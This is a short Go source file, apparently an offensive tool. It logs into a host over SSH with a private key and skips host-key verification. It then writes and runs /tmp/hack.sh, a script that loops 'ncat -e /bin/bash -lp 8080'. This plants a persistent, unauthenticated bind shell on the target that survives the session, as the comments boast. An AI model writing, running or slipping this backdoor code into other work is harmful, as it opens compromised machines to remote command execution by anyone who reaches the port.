package whack

import (
	"net"
	log "github.com/sirupsen/logrus"
	"io/ioutil"
	"golang.org/x/crypto/ssh"
)

func SshConn() {
    key, err := ioutil.ReadFile("<path-to-private-key>")
    if err != nil {
        log.Fatal(err)
    }

    signer, err := ssh.ParsePrivateKey(key)
    if err != nil {
        log.Fatal(err)
    }

    config := &ssh.ClientConfig{
        User: "<user>",
        Auth: []ssh.AuthMethod{
            ssh.PublicKeys(signer),
        },
        HostKeyCallback: func(hostname string, remota net.Addr, key ssh.PublicKey) error {
            // We don't care about OUR safety right now
			return nil
		},
    }

    conn, err := ssh.Dial(
        "tcp",
        "<fqdn/ip>",
        config,
    )
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    // Callback payload
    // Persists even when we kill the session
    cmds := []string{
        "touch /tmp/hack.sh",
        "chmod +x /tmp/hack.sh",
        "echo '#!/bin/bash' > /tmp/hack.sh",
        "echo 'while true; do ncat -e /bin/bash -lp 8080; done &' >> /tmp/hack.sh",
        "/tmp/hack.sh",
    }
    for _, cmd := range(cmds) {
        log.Infof("%s", cmd)
        session, err := conn.NewSession()
        if err != nil {
            log.Fatal(err)
        }
        defer session.Close()

        output, err := session.CombinedOutput(cmd)
        if err != nil {
            log.Fatal(err)
        }
        log.Infof("%s", string(output))
    }
}

